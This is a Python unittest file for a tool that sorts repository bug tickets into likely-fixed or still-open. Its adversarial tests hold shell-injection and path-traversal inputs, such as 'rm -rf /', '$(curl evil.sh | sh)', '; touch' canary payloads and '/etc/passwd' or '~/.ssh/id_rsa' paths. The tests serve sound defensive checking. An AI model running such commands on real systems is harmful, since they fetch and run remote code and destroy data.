#!/usr/bin/env python3
"""Unit tests (pure, no repo needed) + regression test against the real
wayneblacktea checkout using the frozen fixture set in testdata/.

Run: python3 -m unittest test_audit -v
"""
import json
import os
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from lib import extract, rules  # noqa: E402
from lib.gitutil import GitOps, safe_path  # noqa: E402

HERE = Path(__file__).parent


# ── extract.py: pure function tests ─────────────────────────────────────

class TestExtractAnchors(unittest.TestCase):
    def test_file_line_range(self):
        a = extract.extract_anchors("t", "internal/mcp/resources.go:503 broken")
        self.assertEqual(a["files"][0]["path"], "internal/mcp/resources.go")
        self.assertEqual(a["files"][0]["line_start"], 503)
        self.assertEqual(a["files"][0]["line_end"], 503)

    def test_file_line_dash_range(self):
        a = extract.extract_anchors("t", "tools_arch_test.go:92-96 wrong count")
        f = a["files"][0]
        self.assertEqual((f["line_start"], f["line_end"]), (92, 96))

    def test_bare_filename_no_prefix(self):
        a = extract.extract_anchors("t", "context_render.go:97-98 boundary bug")
        self.assertEqual(a["files"][0]["path"], "context_render.go")

    def test_camelcase_symbol(self):
        a = extract.extract_anchors("t", "checkCommandField 沒套用在 title 上")
        self.assertIn("checkCommandField", a["symbols"])

    def test_pascalcase_symbol(self):
        a = extract.extract_anchors("t", "NextActionsTotal 語意不一致")
        self.assertIn("NextActionsTotal", a["symbols"])

    def test_acronym_not_treated_as_symbol(self):
        # ALL-CAPS acronyms (API/GTD/SQL/PR) must NOT match PascalCase —
        # they'd be near-universal noise (every ticket says "API").
        a = extract.extract_anchors("t", "GET /api/projects 的 API 回應")
        self.assertNotIn("API", a["symbols"])

    def test_severity_tag_word_not_treated_as_symbol(self):
        # Every ticket's title carries a severity tag ("🟡 Minor", "🟠
        # Major", "🔴 Critical"). Left unfiltered these match PASCAL_RE and
        # produced a real false SUSPECT_ALREADY_FIXED via fixture testing
        # (5d29b5d1's "Minor" matched an unrelated comment elsewhere).
        a = extract.extract_anchors("[wbt][PR#157 一軍 🟡 Minor] 標題", "🟠 Major 的內容")
        self.assertNotIn("Minor", a["symbols"])
        self.assertNotIn("Major", a["symbols"])

    def test_snake_case_symbol(self):
        a = extract.extract_anchors("t", "repo_name 沒有 neutralize")
        self.assertIn("repo_name", a["symbols"])

    def test_kebab_case_symbol(self):
        a = extract.extract_anchors("t", "untrusted-local-db 邊界標記可被偽造")
        self.assertIn("untrusted-local-db", a["symbols"])

    def test_review_label_and_pr_number(self):
        a = extract.extract_anchors("[wbt][PR#157 R2 二軍 🟠 M-R1] 標題", "body")
        self.assertIn("157", a["pr_numbers"])
        self.assertIn("M-R1", a["labels"])

    def test_commit_sha_requires_cue_word(self):
        a = extract.extract_anchors("t", "base commit 48448bf 上驗證過")
        self.assertIn("48448bf", a["commit_shas"])

    def test_bare_hex_without_cue_is_not_a_commit_sha(self):
        # a 7-char hex-looking token with no "commit" cue must NOT be
        # treated as a commit SHA — too many coincidental collisions.
        a = extract.extract_anchors("t", "the value abcdef1 was measured")
        self.assertNotIn("abcdef1", a["commit_shas"])

    def test_measurement_number(self):
        a = extract.extract_anchors("t", "實測 80,687 bytes")
        self.assertIn("80,687", a["measurements"])

    def test_no_anchors_at_all(self):
        a = extract.extract_anchors("待決", "這是一句完全沒有任何機器可查證錨點的中文描述")
        self.assertFalse(extract.has_any_anchor(a))

    def test_symbol_matching_own_filename_is_dropped(self):
        # A snake_case token that's just the file's own basename (minus
        # extension) is redundant with the file anchor already captured —
        # grepping it repo-wide mostly just re-finds every import of that
        # file, manufacturing false corroboration.
        a = extract.extract_anchors("t", "internal/mcp/resources_test.go 的 resources_test 案例壞了")
        self.assertNotIn("resources_test", a["symbols"])

    # ── adversarial input (backend-security-design.md §2.1 / §5.4 spirit) ──

    def test_control_chars_stripped(self):
        a = extract.extract_anchors("t\x01\x02", "resources.go:10\x00 evil")
        # must not crash, must not preserve control bytes in output
        joined = json.dumps(a)
        self.assertNotIn("\x00", joined)
        self.assertNotIn("\x01", joined)

    def test_shell_metacharacters_survive_as_inert_text(self):
        # extraction must not choke on/interpret shell metacharacters —
        # they're just characters until they reach gitutil, which never
        # shells out with shell=True.
        desc = "internal/mcp/resources.go:10 `; rm -rf / #` $(whoami) `injected`"
        a = extract.extract_anchors("t", desc)
        self.assertEqual(a["files"][0]["path"], "internal/mcp/resources.go")


class TestSafePath(unittest.TestCase):
    def setUp(self):
        self.root = HERE  # scripts/gtd-code-audit itself, has real files

    def test_normal_relative_path_ok(self):
        self.assertIsNotNone(safe_path(self.root, "audit.py"))

    def test_path_traversal_rejected(self):
        self.assertIsNone(safe_path(self.root, "../../../../../../etc/passwd"))

    def test_absolute_path_rejected(self):
        self.assertIsNone(safe_path(self.root, "/etc/passwd"))

    def test_tilde_rejected(self):
        self.assertIsNone(safe_path(self.root, "~/.ssh/id_rsa"))

    def test_null_byte_rejected(self):
        self.assertIsNone(safe_path(self.root, "audit.py\x00.evil"))

    def test_newline_rejected(self):
        self.assertIsNone(safe_path(self.root, "audit.py\ninjected"))


# ── rules.py: decision tree tested against a FAKE GitOps (fast, isolated) ──

class FakeGit:
    """Duck-types GitOps without touching a real repo, for pure decision-
    tree logic tests. The regression suite below uses the REAL GitOps."""

    def __init__(self, files=None, grep_results=None, commit_times=None,
                 line_counts=None, basenames=None, contexts=None):
        self.files = files or set()
        self.grep_results = grep_results or {}   # literal -> [(file, line)]
        self.commit_times = commit_times or {}    # path -> iso ts
        self.line_counts = line_counts or {}       # path -> int
        self.basenames = basenames or {}
        self.contexts = contexts or {}              # (path, line) -> str

    def file_exists(self, p):
        return p in self.files

    def line_count(self, p):
        return self.line_counts.get(p)

    def last_commit_iso(self, p):
        return self.commit_times.get(p)

    def resolve_basename(self, b):
        return self.basenames.get(b)

    def grep_fixed(self, literal):
        return self.grep_results.get(literal, [])

    def read_context(self, path, line, radius=3):
        return self.contexts.get((path, line), "")

    def object_exists(self, sha):
        return False


class TestRulesDecisionTree(unittest.TestCase):
    def test_no_anchor(self):
        git = FakeGit()
        ev = rules.classify("純標題", "完全沒有錨點的描述文字", "2026-08-01T00:00:00+00:00", git)
        self.assertEqual(ev.verdict, "NO_ANCHOR_NEEDS_HUMAN")

    def test_label_citation_within_window(self):
        git = FakeGit(
            grep_results={
                "PR #157": [("internal/mcp/resources.go", 490)],
                "PR#157": [],
                "M-R1": [("internal/mcp/resources.go", 487)],
            },
        )
        ev = rules.classify("[wbt][PR#157 R2 二軍 🟠 M-R1] 標題", "body",
                             "2026-08-15T02:00:00+00:00", git)
        self.assertEqual(ev.verdict, "SUSPECT_ALREADY_FIXED")
        self.assertTrue(ev.verify_commands)

    def test_label_citation_outside_window_does_not_fire(self):
        git = FakeGit(
            grep_results={
                "PR #157": [("internal/mcp/resources.go", 10)],
                "PR#157": [],
                "M-R1": [("internal/mcp/resources.go", 500)],  # 490 lines away
            },
        )
        ev = rules.classify("[wbt][PR#157 R2 二軍 🟠 M-R1] 標題", "internal/mcp/resources.go:12",
                             "2026-08-15T02:00:00+00:00", git)
        self.assertNotEqual(ev.verdict, "SUSPECT_ALREADY_FIXED")

    def test_symbol_found_and_file_touched_after_creation(self):
        git = FakeGit(
            files={"internal/mcp/tools_session.go"},
            grep_results={"checkCommandField": [("internal/mcp/tools_session.go", 66)]},
            commit_times={"internal/mcp/tools_session.go": "2026-08-15T07:19:03+00:00"},
        )
        ev = rules.classify(
            "t", "internal/mcp/tools_session.go:144 checkCommandField 沒套用在 title",
            "2026-08-15T02:53:24+00:00", git)
        self.assertEqual(ev.verdict, "SUSPECT_ALREADY_FIXED")

    def test_symbol_found_but_file_not_touched_since_creation_falls_through(self):
        # symbol happens to exist repo-wide (e.g. predates the ticket) but
        # the specific anchor file was never touched since filing — must
        # NOT be promoted to SUSPECT.
        git = FakeGit(
            files={"internal/handler/gtd_handler.go"},
            grep_results={"ListActiveProjects": [("internal/storage/pg.go", 20)]},
            commit_times={"internal/handler/gtd_handler.go": "2026-08-08T00:59:16+00:00"},
        )
        ev = rules.classify(
            "t", "internal/handler/gtd_handler.go:145 只回 active,ListActiveProjects 沒有 filter",
            "2026-08-08T10:36:14+00:00", git)
        self.assertNotEqual(ev.verdict, "SUSPECT_ALREADY_FIXED")

    def test_still_open_when_file_untouched_since_ticket(self):
        git = FakeGit(
            files={"internal/mcp/boundary_markers.go"},
            line_counts={"internal/mcp/boundary_markers.go": 200},
            commit_times={"internal/mcp/boundary_markers.go": "2026-08-08T16:53:15+00:00"},
        )
        ev = rules.classify(
            "t", "internal/mcp/boundary_markers.go:104 近似標記擋不住",
            "2026-08-15T02:54:08+00:00", git)
        self.assertEqual(ev.verdict, "STILL_OPEN_LIKELY")

    def test_line_out_of_range_degrades_gracefully(self):
        git = FakeGit(
            files={"internal/mcp/resources.go"},
            line_counts={"internal/mcp/resources.go": 50},
        )
        ev = rules.classify("t", "internal/mcp/resources.go:999 過期行號", "2026-08-01T00:00:00+00:00", git)
        self.assertEqual(ev.verdict, "ANCHOR_LINE_OUT_OF_RANGE")

    def test_symbol_not_found_possibly_renamed(self):
        git = FakeGit(grep_results={})  # nothing found anywhere
        ev = rules.classify("t", "someVeryUniqueSymbolName 已被移除", "2026-08-01T00:00:00+00:00", git)
        self.assertEqual(ev.verdict, "SYMBOL_NOT_FOUND_POSSIBLY_RENAMED")

    def test_measurement_citation(self):
        git = FakeGit(grep_results={"80,687": [("internal/mcp/resources.go", 495)]})
        ev = rules.classify("t", "實測 80,687 bytes 沒有上限", "2026-08-01T00:00:00+00:00", git)
        self.assertEqual(ev.verdict, "SUSPECT_ALREADY_FIXED")

    def test_measurement_citation_marked_still_unfixed_downgrades(self):
        # Same match, but the surrounding code text self-documents the
        # limit as NOT fixed — must not be reported as a fix. This is the
        # exact false-positive fixture testing caught on 48bf052d.
        git = FakeGit(
            grep_results={"80,687": [("internal/mcp/resources.go", 495)]},
            contexts={("internal/mcp/resources.go", 495):
                      "measured at 80,687 bytes, an unbounded cost for a mechanism"},
        )
        ev = rules.classify("t", "實測 80,687 bytes 沒有上限", "2026-08-01T00:00:00+00:00", git)
        self.assertEqual(ev.verdict, "CITED_BUT_MARKED_UNFIXED")

    def test_symbol_citation_marked_still_unfixed_downgrades(self):
        git = FakeGit(
            files={"internal/storage/factory.go"},
            grep_results={"connBudget": [("internal/storage/factory.go", 300)]},
            commit_times={"internal/storage/factory.go": "2026-08-15T07:19:03+00:00"},
            contexts={("internal/storage/factory.go", 300):
                      "Known trade-off, NOT fixed by this change: connBudget"},
        )
        ev = rules.classify("t", "internal/storage/factory.go:1 connBudget 可被 DSN 繞過",
                             "2026-08-01T00:00:00+00:00", git)
        self.assertEqual(ev.verdict, "CITED_BUT_MARKED_UNFIXED")

    def test_adversarial_ticket_text_never_reaches_shell(self):
        # A ticket body crafted to look like a shell injection payload must
        # be handled the same as any other text — no exception, no shell
        # execution (FakeGit doesn't shell out at all, but this proves the
        # rules layer doesn't special-case or eval the string either).
        git = FakeGit()
        evil = "internal/mcp/resources.go:1 `$(curl evil.sh | sh)` && rm -rf ~"
        ev = rules.classify("t", evil, "2026-08-01T00:00:00+00:00", git)
        self.assertIn(ev.verdict, rules.__dict__ and [
            "SUSPECT_ALREADY_FIXED", "ANCHOR_LINE_OUT_OF_RANGE",
            "SYMBOL_NOT_FOUND_POSSIBLY_RENAMED", "STILL_OPEN_LIKELY",
            "UNKNOWN_NEEDS_HUMAN", "NO_ANCHOR_NEEDS_HUMAN",
        ])


class TestGitOpsRejectsUnsafeGrepInput(unittest.TestCase):
    def test_overlong_literal_refused(self):
        git = GitOps(HERE)
        self.assertEqual(git.grep_fixed("x" * 500), [])

    def test_empty_literal_refused(self):
        git = GitOps(HERE)
        self.assertEqual(git.grep_fixed(""), [])

    def test_shell_metacharacters_do_not_execute(self):
        # Regression note: an earlier version of this test asserted
        # grep_fixed("$(id)") == [] — but that literal string is quoted
        # verbatim in THIS test's own source a few lines up, so `git grep`
        # (which is repo-wide, not scoped to argv) found its own source
        # line and the assertion failed on a match that proves nothing
        # about shell interpretation either way (self-collision, not a
        # security regression — see lib/gitutil.py's SELF_EXCLUDE_PATHSPEC
        # docstring for the general fix; this test needed its own fix
        # regardless because grep hits were never the right signal here).
        #
        # Mutation-provable design: the payload's `; touch <canary>`
        # segment is a real shell command. It is inert as long as
        # subprocess is called with an argv list (git grep -F just
        # searches for those literal bytes, finds nothing, canary is never
        # created). If _run() were ever changed to shell=True (e.g. via
        # " ".join(argv)), the shell would execute `touch <canary>` for
        # real — the canary file would exist — and this test goes red.
        # Verified by temporarily mutating gitutil.py locally: subprocess.run(
        #   " ".join(["git", "-C", str(self.repo_root), *args]), shell=True, ...)
        # makes this test fail with the canary present, as designed.
        #
        # Rooted at the real repo (not HERE=scripts/gtd-code-audit) so the
        # search scope is the normal, non-degenerate one `audit.py` always
        # uses in practice — GitOps(HERE) would have its own directory as
        # both the include AND the SELF_EXCLUDE_PATHSPEC target, making
        # every grep_fixed() call structurally return [] regardless of the
        # literal, which would silently defeat the first assertion below.
        git = GitOps(_repo_root())
        canary = HERE / f".shell_canary_{os.getpid()}"
        self.addCleanup(lambda: canary.unlink(missing_ok=True))
        self.assertFalse(canary.exists(), "canary must not pre-exist")
        payload = f"zzNoSuchLiteralZZ; touch {canary} #"
        hits = git.grep_fixed(payload)
        self.assertEqual(hits, [], "argv-safe grep must find nothing for a nonexistent literal")
        self.assertFalse(
            canary.exists(),
            "shell metacharacters executed a real command — subprocess must use argv, never shell=True",
        )

    def test_invalid_sha_format_rejected_before_cat_file(self):
        git = GitOps(HERE)
        self.assertFalse(git.object_exists("not-a-sha; rm -rf /"))


# ── Regression suite: real repo, frozen fixture set ─────────────────────

def _repo_root():
    cur = HERE.resolve()
    for d in (cur, *cur.parents):
        if (d / ".git").exists():
            return d
    raise RuntimeError("no .git found above " + str(HERE))


class TestGitOpsSelfExclusion(unittest.TestCase):
    """grep_fixed() must never let this tool's own testdata/tests count as
    corroborating evidence — see SELF_EXCLUDE_PATHSPEC's docstring in
    lib/gitutil.py. Regression coverage for ticket 6f306618's false
    CITED_BUT_MARKED_UNFIXED (branch name in the ticket's own description
    self-matched inside testdata/known_tickets.json)."""

    @classmethod
    def setUpClass(cls):
        cls.git = GitOps(_repo_root())

    def test_self_directory_content_never_matched(self):
        # This exact literal is only known to appear inside
        # testdata/known_tickets.json (a ticket's branch-name mention) —
        # confirmed via `git grep` during triage of this bug. If
        # SELF_EXCLUDE_PATHSPEC regresses, this comes back as a hit.
        hits = self.git.grep_fixed("mcp-token-diet-v2")
        self_dir_hits = [h for h in hits if h[0].startswith("scripts/gtd-code-audit/")]
        self.assertEqual(self_dir_hits, [],
                          f"self-referential hits inside this tool's own dir: {self_dir_hits}")

    def test_real_repo_content_still_matched(self):
        # The exclusion must be scoped to this tool's own directory only —
        # it must not accidentally suppress real matches elsewhere.
        hits = self.git.grep_fixed("wbt-core-mvp")
        self.assertTrue(hits, "exclusion pathspec over-broadly suppressed real repo matches")
        self.assertTrue(any(not f.startswith("scripts/gtd-code-audit/") for f, _ in hits))


class TestAnchorCapAndMemoization(unittest.TestCase):
    """DoS guard regression coverage — Lead's dispatch measured an
    adversarial ticket (many unique symbol-shaped tokens, none matching
    anything) driving lib/rules.py's uncapped symbol iteration to ~1,670
    subprocess calls / 3m04s for one ticket; independently reproduced here
    at 300 tokens -> 37.1s (~0.124s/call), consistent with that figure."""

    def test_symbol_cap_enforced_and_reported(self):
        many_tokens = " ".join(f"zzAdversarialSymbolToken{i}Unmatched" for i in range(500))
        anchors = extract.extract_anchors("t", many_tokens)
        self.assertEqual(len(anchors["symbols"]), extract.MAX_ANCHORS_PER_CATEGORY)
        # Not silently dropped — the truncation MUST be visible in the
        # returned dict so a caller (rules.classify -> audit.py's output)
        # can report it, per README's "no silent caps" policy.
        self.assertIn("symbols", anchors["truncated"])
        self.assertEqual(anchors["truncated"]["symbols"], 500 - extract.MAX_ANCHORS_PER_CATEGORY)

    def test_truncation_surfaces_in_classify_reasons(self):
        git = FakeGit()  # nothing matches -> falls through to NO rule firing early
        many_tokens = " ".join(f"zzAdversarialSymbolToken{i}Unmatched" for i in range(500))
        ev = rules.classify("t", many_tokens, "2026-08-01T00:00:00+00:00", git)
        self.assertTrue(any("截掉" in r for r in ev.reasons),
                         f"truncation notice missing from reasons: {ev.reasons}")

    def test_realistic_ticket_untouched_by_cap(self):
        # The densest real ticket in testdata/known_tickets.json extracts
        # 18 symbols (measured directly) — well under the cap of 50, so no
        # real-world ticket should ever see a truncation notice.
        desc = " ".join(f"realSymbol{i}Example" for i in range(18))
        anchors = extract.extract_anchors("t", desc)
        self.assertEqual(anchors["truncated"], {})

    def test_grep_fixed_memoized_within_instance(self):
        git = GitOps(_repo_root())
        calls = []
        real_run = git._run

        def counting_run(args):
            calls.append(args)
            return real_run(args)

        git._run = counting_run
        git.grep_fixed("wbt-core-mvp")
        git.grep_fixed("wbt-core-mvp")
        git.grep_fixed("wbt-core-mvp")
        self.assertEqual(len(calls), 1,
                          "repeated grep_fixed(same literal) must hit the cache after the first call")

    def test_last_commit_iso_memoized_within_instance(self):
        git = GitOps(_repo_root())
        calls = []
        real_run = git._run

        def counting_run(args):
            calls.append(args)
            return real_run(args)

        git._run = counting_run
        git.last_commit_iso("internal/storage/sqlite/knowledge.go")
        git.last_commit_iso("internal/storage/sqlite/knowledge.go")
        self.assertEqual(len(calls), 1,
                          "repeated last_commit_iso(same path) must hit the cache after the first call")


class TestKnownFixtureRegression(unittest.TestCase):
    """Runs the REAL GitOps (no mock) against the actual wayneblacktea
    checkout for a frozen set of tickets whose ground truth was established
    by direct manual code inspection (not by trusting ticket text or GTD
    status) before this test was written. See README.md 'Fixture provenance'
    for exactly how each was verified.
    """

    @classmethod
    def setUpClass(cls):
        cls.repo_root = _repo_root()
        cls.git = GitOps(cls.repo_root)
        with open(HERE / "testdata" / "known_tickets.json", encoding="utf-8") as f:
            cls.fixtures = json.load(f)

    def _classify(self, fixture):
        return rules.classify(fixture["title"], fixture["description"],
                               fixture["created_at"], self.git)

    def test_verified_positive_fixtures_flagged_suspect(self):
        """Every ticket manually confirmed already-fixed-in-code MUST be
        flagged SUSPECT_ALREADY_FIXED. A miss here is a false negative —
        tolerable per Lead's design (script triages, doesn't judge) but
        should be investigated, not silently accepted."""
        failures = []
        for fx in self.fixtures:
            if fx["fixture_category"] != "positive_verified":
                continue
            ev = self._classify(fx)
            if ev.verdict != "SUSPECT_ALREADY_FIXED":
                failures.append((fx["id"][:8], fx["title"][:60], ev.verdict))
        self.assertFalse(failures,
                          f"{len(failures)} verified-fixed tickets NOT flagged: {failures}")

    def test_verified_negative_fixtures_not_flagged_suspect(self):
        """The one rule that must never break: a ticket manually confirmed
        STILL open in code must never be labelled SUSPECT_ALREADY_FIXED.
        This is the false-positive case Lead explicitly said is more costly
        than a false negative.

        Currently vacuous by design: `known_tickets.json` has ZERO
        `negative_verified` entries (see README.md "Fixture provenance" —
        the one real ticket that lived here, 7610088f, was moved to
        `positive_verified` because its anchor file
        (internal/handler/gtd_handler.go) genuinely got fixed by commit
        582741d, which had already landed in this checkout's history
        *before* the fixture was even frozen — the ground truth was stale
        from the moment it was written, not "rotted" by a later PR). A
        real GTD bug ticket is structurally the wrong anchor for a "this
        must STAY unfixed forever" regression guard, because the entire
        point of filing it is that it eventually gets fixed — see
        test_synthetic_permanent_tradeoff_never_flagged_suspect below for
        the guard that replaces it and does not have this failure mode.
        This test is kept (rather than deleted) so a *future* manually-
        verified still-open ticket can be dropped into this category
        without writing new test code."""
        failures = []
        for fx in self.fixtures:
            if fx["fixture_category"] != "negative_verified":
                continue
            ev = self._classify(fx)
            if ev.verdict == "SUSPECT_ALREADY_FIXED":
                failures.append((fx["id"][:8], fx["title"][:60], ev.verdict))
        self.assertFalse(failures,
                          f"{len(failures)} verified-still-open tickets WRONGLY flagged fixed: {failures}")

    def test_synthetic_permanent_tradeoff_never_flagged_suspect(self):
        """Rot-proof replacement for the "must never false-positive" guard
        (see the docstring above for why a real, fixable GTD bug ticket is
        the wrong anchor for this).

        Anchors to internal/storage/sqlite/knowledge.go's SearchByCosine —
        an ACCEPTED, documented design trade-off (SQLite has no ANN, so it
        brute-force cosine-scans capped at 200 rows; see
        wayneblacktea/CLAUDE.md "SQLite cosine fallback" and the function's
        own doc comment), not a bug anyone is tracking to fix. Unlike a
        real bug ticket, "fixing" this would require a deliberate
        architecture decision (switching SQLite to some ANN index), not an
        incidental commit — so it will not silently flip to "fixed"
        the way 7610088f did.

        `created_at` is computed HERE, at test-run time, as the anchor
        file's own last-commit timestamp — NOT a frozen calendar date. The
        STILL_OPEN_LIKELY rule fires on `last_commit_iso(file) <=
        created_at`; setting created_at equal to that exact measurement
        makes the comparison true by construction on every run, forever,
        regardless of when the test executes — the classic rot vector
        (calendar dates falling behind real repo history) cannot recur
        here because there is no calendar date to fall behind."""
        anchor_file = "internal/storage/sqlite/knowledge.go"
        last_touch = self.git.last_commit_iso(anchor_file)
        self.assertIsNotNone(last_touch, f"{anchor_file} must exist and have git history")
        title = "[synthetic][設計限制,非 bug] SearchByCosine 沒有 ANN,brute-force 硬上限 200 筆"
        description = (
            f"{anchor_file}:651 SearchByCosine — SQLite 沒有 pgvector,brute-force "
            "Go-side cosine scan,LIMIT 200。這是既有接受的設計取捨,不是要修的 bug。"
        )
        ev = rules.classify(title, description, last_touch, self.git)
        self.assertNotEqual(ev.verdict, "SUSPECT_ALREADY_FIXED",
                             f"permanent design trade-off wrongly flagged fixed: {ev.reasons}")

    def test_dispatch_claimed_fixtures_report_honestly(self):
        """These 5 tickets were named by the dispatch as 'should be flagged
        already-fixed', but direct code inspection while building this tool
        found they are NOT clean code fixes (2 are genuinely still-open
        design debt explicitly marked '不擋 merge' in their own ticket
        text, 3 are policy/documentation decisions with no single code
        anchor). This test doesn't assert a verdict — it just prints what
        the script actually says, so the discrepancy is visible in test
        output rather than silently papered over by a loosened rule."""
        for fx in self.fixtures:
            if fx["fixture_category"] != "positive_claimed_by_dispatch":
                continue
            ev = self._classify(fx)
            print(f"  [{fx['id'][:8]}] {fx['title'][:70]} -> {ev.verdict}")
        # no assertion — see README.md "Known discrepancy with dispatch" for
        # the human-readable explanation of why these 5 are handled this way


if __name__ == "__main__":
    unittest.main()
